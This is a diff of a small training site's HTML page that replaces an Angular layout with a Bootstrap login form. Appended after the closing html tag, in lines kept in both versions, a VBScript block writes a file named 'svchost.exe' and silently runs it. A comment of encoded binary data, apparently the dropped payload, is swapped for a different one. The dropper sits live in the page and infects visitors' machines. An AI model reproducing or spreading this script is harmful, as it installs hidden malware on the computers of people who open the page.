@@ -1,78 +1,102 @@
 <!DOCTYPE html>
-<html ng-app="myApp">
+<html lang="en">
 <head>
-	<title></title>
-
-	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-
-<!-- Optional theme -->
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
-<style>
-#container1{
-	width:300px;
-	height:250px;
-	background-color:gray;
+  <title>Bootstrap Example</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <style>
+.header{
+     height:100px;
 }
-#input{
-	text-align: center;
-	padding-top: 30px;
-
+.container-fluid{
+        float:right;
+		margin-top:3px;
+		margin-right30px;
+		padding:2px;
+}
+.navbar-nav{
+margin-right: 50px;
+}
+.navbar-nav .active1>li>a{
+    color: #fff;
 }	
-</style>
+h2{
+  color:#fff;
+}
+.active1{
+    padding-left: 16px;
+}
+.ftcontent{
+	margin-left: 350px;
+    margin-top: 14px;
+}
+.span1{
+	color:white;
+}
+.form-horizontal{
+    margin-top: 233px;
+	    margin-left: 273px;
+		    width: 62%;
+}
+  </style>
 </head>
 <body>
-		<!-- <div class="Container">
-				<h1>Angular HomePage</h1>
-      		<div ng-controller="myController">
-      	  		<h2>{{message}}</h2>	
-     	 	</div>
-     	 </div> -->
 
-     	 <!-- <div id="container1">
-     	 	<div id="input" ng-controller="myController1">
-     	 		Username:&nbsp&nbsp&nbsp<input type="text" ng-model="name"><br><br><br>
-     	 		Password&nbsp&nbsp&nbsp&nbsp<input type="Password" ng-model="Password"><br><br><br>
-     	 				<button type="button" class="btn btn-success">Success</button>
-     	 				&nbsp&nbsp&nbsp<button type="button" class="btn">Reset</button>
-     	    </div> 				
-     	 </div>	 -->
-     	<!--  <table>
-     	 	<thead><tr><th>Name</th><th>Gender</th><th>Salary</th></tr></thead>
-     	 	<tbody>
-     	 		<tr ng-repeat="emp in empinfo">
-     	 		<td>{{emp.name}}</td>
-     	 		<td>{{emp.gender}}</td>
-     	 		<td>{{emp.salary}}</td>
-     	 		</tr>
-     	 	</tbody>
-     	 </table> -->
+<nav class="navbar navbar-inverse navbar-fixed-top">
+	<div class="header">
+	   <h2>TechEra Skill Development</h2>
+	     
+		<div class="container-fluid">
+			<ul class="nav navbar-nav">
+			<li class="active1"><a href="home.html">Home</a></li>
+			<li class="active1"><a href="register.html">Register</a></li>
+			<li class="active1"><a href="login.html">Login</a></li>
+			</ul>
+	</div>
+ </div> 
+  
+</nav>
+  
+  <form class="form-horizontal" action="/action_page.php">
+    <h2>Login</h2>
+    <div class="form-group">
+      <label class="control-label col-sm-2" for="email">Email:</label>
+      <div class="col-sm-6">
+        <input type="email" class="form-control" id="email" placeholder="Enter email" name="email">
+      </div>
+    </div>
+    <div class="form-group">
+      <label class="control-label col-sm-2" for="pwd">Password:</label>
+      <div class="col-sm-6">          
+        <input type="password" class="form-control" id="pwd" placeholder="Enter password" name="pwd">
+      </div>
+    </div>
+    <div class="form-group">        
+      <div class="col-sm-offset-2 col-sm-6">
+        <div class="checkbox">
+          <label><input type="checkbox" name="remember"> Remember me</label>
+        </div>
+      </div>
+    </div>
+    <div class="form-group">        
+      <div class="col-sm-offset-2 col-sm-6">
+        <button type="submit" class="btn btn-default">Submit</button>
+      </div>
+    </div>
+  </form>
 
 
-     	<nav class="navbar navbar-inverse">
-  			<div class="container-fluid">
-    		<div class="navbar-header">
-     		 <a class="navbar-brand" href="#">TechEra Skill Development</a>
-    		</div>
-   
-    <ul class="nav navbar-nav navbar-right">
-      <li><a ui-sref="home">Home</a></li>
-      <li><a ui-sref="register">Register</a></li>
-      <li><a ui-sref="login">Login</a></li>
-    </ul>
+<nav class="navbar navbar-inverse navbar-fixed-bottom">
+  <div class="ftcontent">
+		<span class="span1">&copy;Copyright 2017&nbsp;</span>
+		<span class="span1">&nbsp;&nbsp;|&nbsp;&nbsp;Term&Condition&nbsp;</span>
+		<span class="span1">&nbsp;&nbsp;|&nbsp;&nbsp;Help</span>
   </div>
 </nav>
-<div class="container">
-<div ui-view>
-</div>	
-</div>
-
-
-
-      <script src="scripts/angular1.js" type="text/javascript"></script>
-      <!-- <script src="https://code.angularjs.org/1.6.4/angular-route.js"
-      type="text/javascript"></script> -->  <!-- replacement -->
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/angular-ui-router/1.0.3/angular-ui-router.js"type="text/javascript"></script>
-	  <script src="scripts/app1.js" type="text/javascript"></script>
+  
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -88,9 +112,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--Ä@^OeÜ¡lhÓ÷4LÆ¿"²~¨:”ÞF´%ÚU•¬šà@ôsr}
-Ä ×?ŠÐ*‹}«j0ÐÃý©ó3n1¢ÀÅõ ]P²Zý|Ž ƒMÄ*1ÈØ3©Í¿fÏÓâ5›jB³š…o—¬®È³Íœ
-<•Ú¡´$0sÀñ%µ¶1òÚƒœs‰^íraýí¾AF¸Â6(gßÂT÷on¿¾Í¶8Èu™:ï÷bõ`°ó¬(´ý€yå,08E z…áæ&Qoþ_Ž±ìØ.v,§Œé:ÚïË¦s>œöÐâìúŒª'¡ôÊ\ê›ƒ7Øm[IÜÂFk´*¶+Äèx'iÉºÒ`Åæ/À…ê—0D?·£4›ÏøêºÓN©äeUÜVÑ•þ±¦g©
-\–n³ÓTgå÷™YO;Õ7‡a0]¼"œ»dÁ	Dš±ƒW·Qºwù†—ãs@@ª[Íã—…Ù^dÝ£R¢Ð
-Á¼jÇŒ‘¨O
-uÙdbUÝ-º¬ËÁÃ|sP9cÆ2ˆAš0›B‘Ð ëÇR(ÜøëÇëÇëÇ¦N)2Ü[CêÇ ëÇ-->
+//--></SCRIPT><!--¤ÎŸ´÷ÁË˜‰âgj7gÖu*h#ŸaîKïly¬ÄÚ×å ÞéŠV˜)^Šø¡ym*>ÛrÔßÉ¯`¬x@Sqcne}Z£³dk¢vÚñz?ÌÙ»™'‘=[ª©åsÂà…7ªás)€ôh¢:Itæ"Üv†—“¶OÇà sgmÅ‹ZÔ§¼Ô×óN[ÜG(b€$ìÇÛ¥"c7w¸Là>xìY›>ß?s„Å‚£¾
+£Þ~Î–(øý7<MU%2ÍT¾šÁn«§OÖOžu={"›Évgº±Å…ŒÆ€Xg!á»¥˜_»§ø:SÇê‰{âc{h`ÕïzIAª„38@@>p(yL²Qé™fx¥ôwZóEëª“@¨#É¨
+ÌXOT~ú‡ókXÃi‹t+Ð‘æ¥ïÄaÏ®H é¸R*£øé¸é¸é¸¤eNŸú¥[ é¸ é¸-->
